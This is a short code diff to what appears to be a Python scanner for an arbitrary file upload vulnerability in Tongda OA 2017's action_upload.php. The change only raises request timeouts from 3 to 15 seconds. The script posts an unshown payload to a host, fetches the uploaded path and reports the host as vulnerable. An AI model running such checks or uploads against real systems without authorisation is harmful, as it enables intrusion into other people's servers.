@@ -53,8 +53,8 @@ def test(host):
     url = host+payload2
     url2 = host+payload3
     try:
-        requests.post(url, headers=header, timeout=3, verify=False,data=payload)
-        req2 = requests.get(url2,timeout=3, verify=False)
+        requests.post(url, headers=header, timeout=15, verify=False,data=payload)
+        req2 = requests.get(url2,timeout=15, verify=False)
         if req2.status_code == 200:
             print(host+"存在通达OA2017 action_upload.php任意文件上传漏洞")
             print("返回路径：" + url2+'\n')
